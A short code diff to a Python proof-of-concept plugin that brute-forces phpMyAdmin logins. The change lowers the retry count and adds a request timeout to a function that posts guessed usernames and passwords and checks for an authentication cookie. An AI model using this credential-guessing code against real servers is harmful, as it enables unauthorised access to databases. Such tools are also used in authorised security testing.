@@ -36,7 +36,7 @@ class PmaBurstPOC(POCBase):
     category = POC_CATEGORY.TOOLS.CRACK
 
     def pma_login(self, url, username, password):
-        for i in range(3):
+        for i in range(2):
             try:
                 res = requests.get(url)
                 cookies = dict(res.cookies)
@@ -46,7 +46,7 @@ class PmaBurstPOC(POCBase):
                     'pma_username': username,
                     'pma_password': password,
                 }
-                res = requests.post(url, cookies=cookies, data=data)
+                res = requests.post(url, cookies=cookies, data=data, timeout=3)
                 cookies = dict(res.cookies)
                 return 'pmaAuth-1' in cookies
             except:
